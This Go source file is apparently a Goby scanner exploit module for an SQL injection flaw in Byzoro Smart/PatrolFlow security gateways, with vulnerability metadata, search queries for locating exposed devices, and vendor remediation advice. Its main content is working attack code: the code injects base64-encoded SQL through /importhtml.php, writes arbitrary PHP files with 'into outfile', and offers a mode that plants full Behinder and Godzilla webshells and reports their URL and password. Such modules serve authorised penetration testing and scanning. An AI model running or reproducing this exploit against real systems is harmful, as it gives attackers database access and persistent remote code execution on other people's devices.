package exploits

import (
	"encoding/base64"
	"encoding/hex"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Byzoro Smart Internet Behavior Management System importhtml File Sql Injection",
    "Description": "<p>Byzoro Smart Internet Behavior Management System is a powerful online behavior management and content audit system.</p><p>Byzoro Smart Internet Behavior Management System has a SQL injection vulnerability. Attackers can exploit vulnerabilities to obtain sensitive database information.</p>",
    "Product": "byzoro-SecGW",
    "Homepage": "http://www.byzoro.com/",
    "DisclosureDate": "2021-10-26",
    "Author": "14m3ta7k",
    "FofaQuery": "( title=\"PatrolFlow\" || body=\"&nbsp;PatrolFlow 多业务安全网关\" || title=\"Patflow--管理平台\")||(body=\"Smart S150&nbsp;系统登录\" || title=\"Smart--管理平台\")",
    "GobyQuery": "( title=\"PatrolFlow\" || body=\"&nbsp;PatrolFlow 多业务安全网关\" || title=\"Patflow--管理平台\")||(body=\"Smart S150&nbsp;系统登录\" || title=\"Smart--管理平台\")",
    "Level": "2",
    "Impact": "<p>Byzoro Smart Internet Behavior Management System has a SQL injection vulnerability. Attackers can exploit vulnerabilities to obtain sensitive database information.</p>",
    "References": [
        "https://www.cnvd.org.cn/flaw/show/CNVD-2020-28786",
        "https://www.cnvd.org.cn/flaw/show/CNVD-2021-40201"
    ],
    "Translation": {
        "CN": {
            "Name": "百卓 Smart 多业务安全网关智能管理平台 importhtml 文件 SQL 注入漏洞",
            "Product": "byzoro-安全网关",
            "Description": "<p>百卓 Smart 多业务安全网关智能管理平台是一个强大的上网行为管理及内容审计系统。</p><p>百卓 Smart 多业务安全网关智能管理平台存在 SQL 注入漏洞。攻击者可利用漏洞获取数据库敏感信息。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://www.byzoro.com/index.php/Home/Download/download\">https://www.byzoro.com/index.php/Home/Download/download</a></p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。<br>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>百卓 Smart 多业务安全网关智能管理平台存在 SQL 注入漏洞。攻击者可利用漏洞获取数据库敏感信息。</p>",
            "VulType": [
                "SQL注入",
                "文件上传"
            ],
            "Tags": [
                "SQL注入",
                "文件上传",
                "两高一弱"
            ]
        },
        "EN": {
            "Name": "Byzoro Smart Internet Behavior Management System importhtml File Sql Injection",
            "Product": "byzoro-SecGW",
            "Description": "<p>Byzoro Smart Internet Behavior Management System is a powerful online behavior management and content audit system.</p><p>Byzoro Smart Internet Behavior Management System has a SQL injection vulnerability. Attackers can exploit vulnerabilities to obtain sensitive database information.</p>",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.byzoro.com/index.php/Home/Download/download\">https://www.byzoro.com/index.php/Home/Download/download</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.<br>2. If not necessary, prohibit public network access to the system.</p>",
            "Impact": "<p>Byzoro Smart Internet Behavior Management System has a SQL injection vulnerability. Attackers can exploit vulnerabilities to obtain sensitive database information.</p>",
            "VulType": [
                "File Upload",
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "File Upload",
                "2H1W"
            ]
        }
    },
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,fileUpload,webShell,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "sleep(5)",
            "show": "attackType=sql"
        },
        {
            "name": "filename",
            "type": "input",
            "value": "teaaa.php",
            "show": "attackType=fileUpload"
        },
        {
            "name": "fileContent",
            "type": "input",
            "value": "<?php echo(md5(123)); ?>",
            "show": "attackType=fileUpload"
        },
        {
            "name": "webShell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webShell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "File Upload",
        "2H1W"
    ],
    "VulType": [
        "File Upload",
        "SQL Injection"
    ],
    "CVEIDs": [],
    "CNNVD": [],
    "CNVD": [
        "CNVD-2021-40201"
    ],
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": [
            "Byzoro-smart-Patflow"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time:<a href=\"https://www.byzoro.com/index.php/Home/Download/download\">https://www.byzoro.com/index.php/Home/Download/download</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.2. If not necessary, prohibit public network access to the system.</p>",
    "PocId": "9934"
}`
	executeSqlDJKPWOQIJR := func(hostInfo *httpclient.FixUrl, sql string) bool {
		config := httpclient.NewGetRequestConfig(`/importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=` + base64.StdEncoding.EncodeToString([]byte(sql)))
		config.VerifyTls = false
		resp, err := httpclient.DoHttpRequest(hostInfo, config)
		if err != nil {
			return false
		}
		return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, `</title></head>`)
	}

	getFileResultDWJQPIOEJ := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		config := httpclient.NewGetRequestConfig(uri)
		config.VerifyTls = false
		return httpclient.DoHttpRequest(hostInfo, config)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randFilename := goutils.RandomHexString(5) + ".php"
			sqlQuery := `select 0x3c3f706870206563686f206d643528323333293b756e6c696e6b285f5f46494c455f5f293b3f3e into outfile '/usr/hddocs/nsg/app/` + randFilename + "'"
			if !executeSqlDJKPWOQIJR(hostInfo, sqlQuery) {
				return false
			}
			resp, err := getFileResultDWJQPIOEJ(hostInfo, fmt.Sprintf("/app/%s", randFilename))
			if err != nil {
				return false
			}
			return resp.StatusCode == 200 && strings.Contains(resp.RawBody, "e165421110ba03099a1c0393373c5b43")
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := ss.Params["attackType"].(string)
			sqlQuery := ""
			filename := ""
			password := ""
			tool := ""
			if attackType == "sql" {
				sqlQuery = ss.Params["sql"].(string)
			} else if attackType == "sqlPoint" {
				expResult.Success = true
				expResult.Output = fmt.Sprintf(`sql注入语句需要进行Base64编码
GET /importhtml.php?type=exporthtmlmail&tab=tb_RCtrlLog&sql=c2xlZXAoNSk= HTTP/1.1
Host: %s
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
`,expResult.HostInfo.HostInfo)
			} else if attackType == "fileUpload" {
				filename = ss.Params["filename"].(string)
				fileContent := hex.EncodeToString([]byte(ss.Params["fileContent"].(string)))
				sqlQuery = fmt.Sprintf(`select 0x%s into outfile '/usr/hddocs/nsg/app/%s'`, fileContent, filename)
			} else if attackType == "webShell" {
				filename = goutils.RandomHexString(5) + ".php"
				fileContent := ""
				if ss.Params["webShell"].(string) == "behinder" {
					tool = "Behinder v3.0"
					password = "rebeyond"
					fileContent = `<?php @error_reporting(0);session_start();$key="e45e329feb5d925b";$_SESSION["k"]=$key;session_write_close();$post=file_get_contents("php://input");if(!extension_loaded("openssl")){$t="base64_"."decode";$post=$t($post."");for($i=0;$i<strlen($post);$i++){$post[$i]=$post[$i]^$key[$i+1&15];}}else{$post=openssl_decrypt($post,"AES128",$key);}$arr=explode("|",$post);$func=$arr[0];$params=$arr[1];class C{public function __invoke($p){eval($p."");}}@call_user_func(new C(),$params);?>`
				} else if ss.Params["webShell"].(string) == "godzilla" {
					password = "pass 加密器：PHP_XOR_BASE64"
					tool = "Godzilla v4.1"
					fileContent = `<?php @session_start(); @set_time_limit(0); @error_reporting(0); function encode($D,$K){ for($i=0;$i<strlen($D);$i++) { $c = $K[$i+1&15]; $D[$i] = $D[$i]^$c; } return $D; } $pass="pass"; $payloadName="payload"; $key="3c6e0b8a9c15224a"; if (isset($_POST[$pass])){ $data=encode(base64_decode($_POST[$pass]),$key); if (isset($_SESSION[$payloadName])){ $payload=encode($_SESSION[$payloadName],$key); if (strpos($payload,"getBasicsInfo")===false){ $payload=encode($payload,$key); } eval($payload); echo substr(md5($pass.$key),0,16); echo base64_encode(encode(@run($data),$key)); echo substr(md5($pass.$key),16); }else{ if (strpos($data,"getBasicsInfo")!==false){ $_SESSION[$payloadName]=encode($data,$key);}}}?>`
				}
				sqlQuery = fmt.Sprintf(`select 0x%s into outfile '/usr/hddocs/nsg/app/%s'`, hex.EncodeToString([]byte(fileContent)), filename)
			}
			if !executeSqlDJKPWOQIJR(expResult.HostInfo, sqlQuery) {
				return expResult
			}
			if attackType == "sql" {
				expResult.Success = true
				expResult.Output = "盲注漏洞，SQL执行成功！"
				return expResult
			}
			resp, _ := getFileResultDWJQPIOEJ(expResult.HostInfo, "/app/"+filename)
			if resp.StatusCode != 200 {
				return expResult
			}
			expResult.Success = true
			if attackType == "fileUpload" {
				expResult.Output = "文件地址：" + expResult.HostInfo.FixedHostInfo + "/app/" + filename
			} else if ss.Params["attackType"].(string) == "webShell" {
				expResult.Output = "WebShell URL: " + expResult.HostInfo.FixedHostInfo + "/app/" + filename + "\n"
				expResult.Output += "Password: " + password + "\n"
				expResult.Output += "WebShell tool: " + tool + "\n"
				expResult.Output += "Webshell type: php"
			}
			return expResult
		},
	))
}
